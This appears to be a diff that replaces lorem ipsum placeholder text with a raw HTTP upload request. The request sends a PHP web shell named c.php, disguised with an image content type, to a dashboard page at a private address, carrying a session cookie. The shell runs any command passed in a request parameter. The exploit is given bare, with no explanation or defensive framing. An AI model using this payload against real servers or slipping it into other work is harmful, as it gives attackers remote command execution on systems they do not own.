@@ -1,7 +1,28 @@
- Lorem ipsum dolor sit amet, consectetur adipiscing elit. In nec ultrices lacus. Cras facilisis, arcu sit amet venenatis pharetra, felis quam vehicula sapien, ut blandit neque ante sollicitudin nibh. Etiam quis imperdiet ipsum. Suspendisse id nunc augue. Nullam quis mauris lectus. Vestibulum tincidunt, turpis et elementum cursus, ipsum eros eleifend quam, et rutrum nibh nunc vel eros. Suspendisse rutrum nibh eu magna lacinia eleifend. Ut maximus neque nec ultrices tristique. In gravida quam vel venenatis malesuada. In dapibus est aliquet lacus ultrices, vitae lobortis eros ultricies. Ut viverra id mi egestas aliquet. Quisque malesuada dolor non rhoncus malesuada. Donec condimentum dui id odio vehicula, a tincidunt nisi fringilla. Donec posuere justo ante, vitae aliquet erat consectetur eget.
+POST /dashboard.php?PHPSESSID=97hca4hurd2jveu9pubiuo4331 HTTP/1.1
+Host: 10.0.1.21
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.0.1.21/dashboard.php?PHPSESSID=97hca4hurd2jveu9pubiuo4331
+Content-Type: multipart/form-data; boundary=---------------------------17150442413427579601423744755
+Content-Length: 500
+Cookie: PHPSESSID=97hca4hurd2jveu9pubiuo4331
+Connection: close
+Upgrade-Insecure-Requests: 1
 
-Phasellus vitae libero mattis, dictum tortor non, fringilla arcu. Proin sed ante quam. Pellentesque dapibus felis in justo porttitor, et rutrum orci molestie. Nunc bibendum, tortor nec fringilla sagittis, urna lectus convallis nunc, eget aliquet tortor nunc et mi. Morbi a tellus sit amet mi blandit interdum. Maecenas eu venenatis ex. Proin at justo eu elit ultrices rutrum. Integer nunc risus, congue sodales efficitur ac, tempor non mi. Nullam euismod turpis ut ante interdum ullamcorper.
+-----------------------------17150442413427579601423744755
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
 
-Vivamus eget mauris a augue vulputate viverra. Nunc semper eros ut eros iaculis, rhoncus iaculis magna laoreet. Mauris quis justo eleifend, malesuada elit quis, vehicula ex. Sed mauris ipsum, sollicitudin non turpis at, porttitor mattis nibh. Pellentesque congue turpis ac tincidunt finibus. Maecenas id volutpat massa. Quisque malesuada, ex vel auctor congue, mauris dolor elementum diam, nec dapibus est dui at ipsum. Donec luctus suscipit tincidunt. Aliquam luctus semper lorem, mollis viverra turpis bibendum vestibulum. Mauris pretium posuere ipsum, sed tincidunt nisi finibus a. Curabitur ut facilisis ex. Interdum et malesuada fames ac ante ipsum primis in faucibus. Cras dapibus sit amet odio eget commodo. In eget vestibulum nibh. Pellentesque aliquam, magna et pellentesque placerat, justo nulla porta ante, pretium venenatis arcu nulla id sapien. Fusce at efficitur arcu.
+100000
+-----------------------------17150442413427579601423744755
+Content-Disposition: form-data; name="uploaded"; filename="c.php"
+Content-Type: image/jpeg
 
-Maecenas est odio, tincidunt a blandit quis, interdum sed orci. Mauris eu eros vel purus aliquet rhoncus et eu sapien. Praesent sapien ante, pretium sit amet tortor tincidunt, rutrum interdum quam. Aliquam tortor nibh, maximus non lorem eu, interdum viverra risus. Nullam finibus cursus risus, ac mollis arcu laoreet in. Phasellus semper vitae libero et molestie. Nunc id bibendum justo. Aliquam erat volutpat. In tortor enim, volutpat eget vehicula id, molestie ut neque.
+<?php echo system($_REQUEST['haco']); ?>
+-----------------------------17150442413427579601423744755
+Content-Disposition: form-data; name="Upload"
+
+Upload
+-----------------------------17150442413427579601423744755--
+======================================================================
